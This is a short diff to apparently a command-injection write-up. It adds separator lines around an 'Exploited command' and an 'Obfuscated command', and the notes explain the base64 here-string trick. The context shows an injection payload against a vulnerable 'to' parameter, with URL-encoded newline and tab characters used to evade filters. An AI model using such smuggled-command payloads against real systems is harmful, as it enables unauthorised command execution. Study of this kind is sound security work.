@@ -62,11 +62,11 @@ cat /home
 Vulnerable parameter > to
 
 Exploited command
-
+------------------
 bash<<<$(base64 -d<<<whoami)
 
 Obfuscated command
-
+------------------
 %0abash<<<$(base64%09-d<<<d2hvYW1p)
 
 bash<<< ...
@@ -84,10 +84,7 @@ base64 -d<<<d2hvYW1p
 <<<d2hvYW1p → here-string passes the string d2hvYW1p into base64 -d.
 
 base64 -d decodes it.
-
-
 ```
-
 
 <img width="1552" height="486" alt="image" src="https://github.com/user-attachments/assets/50036e12-15f4-490b-8b97-3d658c263a2d" />
 
